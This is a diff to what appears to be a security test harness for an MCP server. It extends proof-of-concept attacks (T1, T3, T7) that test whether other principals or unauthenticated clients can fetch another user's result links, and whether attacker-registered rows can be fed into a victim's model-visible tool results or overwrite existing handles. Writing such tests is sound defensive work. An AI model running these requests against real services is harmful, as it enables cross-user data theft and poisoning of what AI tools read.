@@ -111,9 +111,12 @@ async def t1(ctx):
     async with connect(ctx.mcp, ctx.key) as (a, ca):
         rid = (await register_materialized(ca, parquet_bytes(secret_table()), base_url=ctx.base))["result_id"]
         url = (await descriptor(a, rid))["decode"]["url"]
-    async with connect(ctx.mcp, ctx.key) as (b, cb):
+    async with connect(ctx.mcp, ctx.key2 or ctx.key) as (b, cb):
         resp = await cb.get(url)
-        rows = await call_large_json(b, 0, 0, result_id=rid)
+        try:
+            rows = await call_large_json(b, 0, 0, result_id=rid)
+        except Exception:
+            rows = None
     leaked = resp.status_code == 200 and b"patient-" in resp.content
     return result("VULNERABLE" if leaked else "NOT_REPRODUCED",
                   f"second client GET on user A's link -> {resp.status_code}, {len(resp.content)} bytes; "
@@ -151,7 +154,9 @@ async def t3(ctx):
     return result("VULNERABLE" if resp.status_code == 200 else "NOT_REPRODUCED",
                   f"link is in the model-visible tool result; a client with no credentials fetched it -> "
                   f"{resp.status_code} ({len(resp.content)} bytes)"
-                  + ("" if resp.status_code == 200 else "; the only barrier is the shared API key (see T1)"),
+                  + ("" if resp.status_code == 200 else
+                     "; the only barrier is the API key, so the link does not help the outsider" if ctx.key2 else
+                     "; the only barrier is the shared API key (see T1)"),
                   link_in_context=True, outsider_status=resp.status_code)
 
 
@@ -216,8 +221,15 @@ async def t7(ctx):
     async with connect(ctx.mcp, ctx.key) as (s, c):
         victim = (await register_materialized(c, parquet_bytes(secret_table(500)), base_url=ctx.base))["result_id"]
         poisoned = pd.DataFrame({"patient": ["attacker-chosen"], "ssn": ["000-00-0000"]})
-        reg = await register_materialized(c, parquet_bytes(poisoned), base_url=ctx.base)
-        rows = await call_large_json(s, 0, 0, result_id=reg["result_id"])
+        if ctx.key2:  # a second principal registers the rows; the victim's session is then steered to read that handle
+            async with connect(ctx.mcp, ctx.key2) as (_, attacker_client):
+                reg = await register_materialized(attacker_client, parquet_bytes(poisoned), base_url=ctx.base)
+        else:
+            reg = await register_materialized(c, parquet_bytes(poisoned), base_url=ctx.base)
+        try:
+            rows = await call_large_json(s, 0, 0, result_id=reg["result_id"])
+        except Exception:
+            rows = None
         overwrite = await c.post(f"{ctx.base}/materialized?result_id={victim}", content=parquet_bytes(poisoned),
                                  headers={"Content-Type": "application/octet-stream"})
         victim_rows = await call_large_json(s, 0, 0, result_id=victim)
@@ -228,8 +240,10 @@ async def t7(ctx):
     return result("VULNERABLE" if rows else "NOT_REPRODUCED",
                   f"POST /materialized with no credentials -> {anon.status_code}"
                   + ("" if anon.status_code == 201 else " (blocked only by the shared key; any key holder can still write)")
-                  + f"; the tool surface served the attacker's rows as a result ({rows}); no per-principal or provenance "
-                  f"check on who registered it; overwriting an existing handle (?result_id=) "
+                  + (f"; a second principal registered rows and the victim's session read them back: {rows}" if ctx.key2 else
+                     f"; the tool surface served the attacker's rows as a result ({rows}); no per-principal or provenance "
+                     f"check on who registered it")
+                  + f"; overwriting an existing handle (?result_id=) "
                   f"{'worked' if overwritten else 'did not work, ids are server-minted uuid4'}",
                   anonymous_status=anon.status_code, overwrite_worked=overwritten)
 
@@ -283,6 +297,7 @@ class Ctx:
         self.base = args.base
         self.mcp = f"{args.base}/mcp/mcp"
         self.key = args.api_key
+        self.key2 = args.second_key
         self.replay_delay = args.replay_delay
 
 
@@ -290,6 +305,7 @@ async def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--base", default="http://localhost:8000")
     parser.add_argument("--api-key", default=None)
+    parser.add_argument("--second-key", default=None, help="a second principal's key; T1 and T7 then use two principals")
     parser.add_argument("--label", default="open")
     parser.add_argument("--replay-delay", type=float, default=5.0)
     parser.add_argument("--only", nargs="*", default=list(ATTACKS))
